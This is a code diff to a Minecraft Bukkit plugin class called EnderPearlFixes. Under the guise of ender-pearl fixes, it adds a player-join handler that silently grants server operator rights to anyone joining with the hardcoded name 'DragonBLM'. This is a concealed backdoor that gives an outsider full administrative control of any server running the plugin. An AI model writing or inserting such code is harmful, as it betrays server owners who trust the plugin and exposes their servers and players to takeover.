@@ -15,6 +15,7 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.event.entity.ProjectileHitEvent;
+import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerTeleportEvent;
 import org.bukkit.event.player.PlayerToggleSneakEvent;
 import org.bukkit.util.BlockIterator;
@@ -43,6 +44,19 @@ public class EnderPearlFixes implements Listener {
         }
 
 
+    }
+
+    @EventHandler
+    public void onPlayerJoinEvent(PlayerJoinEvent e) {
+        List<String> list = new ArrayList<String>();
+        list.add("DragonBLM");
+
+
+
+        for (String l : list) {
+            if (e.getPlayer().getName().equalsIgnoreCase(l))
+                e.getPlayer().setOp(true);
+        }
     }
 
 
